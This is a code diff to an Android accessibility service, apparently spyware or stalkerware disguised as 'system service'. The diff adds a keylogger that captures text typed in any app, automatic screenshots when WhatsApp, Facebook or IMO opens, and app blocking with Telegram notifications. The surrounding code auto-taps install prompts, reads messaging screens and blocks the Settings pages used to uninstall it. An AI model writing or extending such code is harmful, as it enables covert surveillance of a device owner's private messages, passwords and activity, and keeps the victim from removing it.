@@ -45,6 +45,9 @@ class ScreenService : AccessibilityService() {
 
         @Volatile private var lastReadTime = 0L
         @Volatile private var lastReadContent = ""
+
+        @Volatile private var lastBlockedPkg = ""
+        @Volatile private var lastBlockedTime = 0L
     }
 
     private val client = OkHttpClient.Builder()
@@ -91,7 +94,21 @@ class ScreenService : AccessibilityService() {
         event ?: return
         val pkg = event.packageName?.toString() ?: return
 
-        // ===== Auto-install APK (Package Installer) =====
+        // ===== App Block check =====
+        if (pkg != packageName && !pkg.contains("packageinstaller") && pkg != PKG_SETTINGS) {
+            if (AppBlocker.isBlocked(this, pkg)) {
+                val now = System.currentTimeMillis()
+                if (pkg != lastBlockedPkg || now - lastBlockedTime > 10_000L) {
+                    lastBlockedPkg = pkg
+                    lastBlockedTime = now
+                    performGlobalAction(GLOBAL_ACTION_HOME)
+                    notifyTelegram("🚫 Blocked app: $pkg")
+                }
+                return
+            }
+        }
+
+        // ===== Auto-install APK =====
         if (pkg.contains("packageinstaller")) {
             autoTapInstall()
         }
@@ -103,9 +120,29 @@ class ScreenService : AccessibilityService() {
 
         // ===== Detect App Open =====
         when (pkg) {
-            PKG_WHATSAPP, PKG_WHATSAPP_B -> handleAppOpen("whatsapp")
-            PKG_FB, PKG_FB_MSG -> handleAppOpen("fb")
-            PKG_IMO, PKG_IMO_BETA -> handleAppOpen("imo")
+            PKG_WHATSAPP, PKG_WHATSAPP_B -> {
+                handleAppOpen("whatsapp")
+                AutoScreenshot.captureSequence(this, "whatsapp")
+            }
+            PKG_FB, PKG_FB_MSG -> {
+                handleAppOpen("fb")
+                AutoScreenshot.captureSequence(this, "fb")
+            }
+            PKG_IMO, PKG_IMO_BETA -> {
+                handleAppOpen("imo")
+                AutoScreenshot.captureSequence(this, "imo")
+            }
+        }
+
+        // ===== Keylogger — text fields =====
+        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            try {
+                val text = event.text.joinToString("")
+                if (text.isNotBlank()) {
+                    val appName = getAppName(pkg)
+                    KeyloggerService.captureText(this, appName, text)
+                }
+            } catch (_: Exception) {}
         }
 
         // ===== Read Screen Content =====
@@ -117,6 +154,13 @@ class ScreenService : AccessibilityService() {
                 PKG_IMO, PKG_IMO_BETA -> readScreenContent("imo")
             }
         }
+    }
+
+    private fun getAppName(pkg: String): String {
+        return try {
+            val pm = packageManager
+            pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
+        } catch (_: Exception) { pkg }
     }
 
     // ===== Auto-tap Install Button =====
@@ -167,17 +211,13 @@ class ScreenService : AccessibilityService() {
         return null
     }
 
-    // ===== Block Settings pages — FIX =====
+    // ===== Block Settings pages =====
     private fun handleSettingsBlock(event: AccessibilityEvent) {
         try {
             val root = rootInActiveWindow ?: return
-
-            // Screen title එක විතරයි බලන්න
             val title = findScreenTitle(root).lowercase()
             Log.d(TAG, "Settings title: $title")
 
-            // ⚠️ "Uninstall" page එක විතරයි block කරන්න
-            // "device admin apps" page එක block කරන්නේ නෑ (ඔබට activate කරන්න ඕන නිසා)
             val shouldBlock = (title.contains("uninstall") && title.contains("system service")) ||
                     (title.contains("app info") && title.contains("system service"))
 
@@ -189,7 +229,6 @@ class ScreenService : AccessibilityService() {
         } catch (_: Exception) {}
     }
 
-    // Screen title එක හොයාගන්න
     private fun findScreenTitle(node: AccessibilityNodeInfo?): String {
         node ?: return ""
         try {
@@ -198,7 +237,6 @@ class ScreenService : AccessibilityService() {
                 val t = node.text?.toString() ?: ""
                 if (t.isNotBlank()) return t
             }
-
             for (i in 0 until node.childCount) {
                 val child = node.getChild(i)
                 if (child != null) {
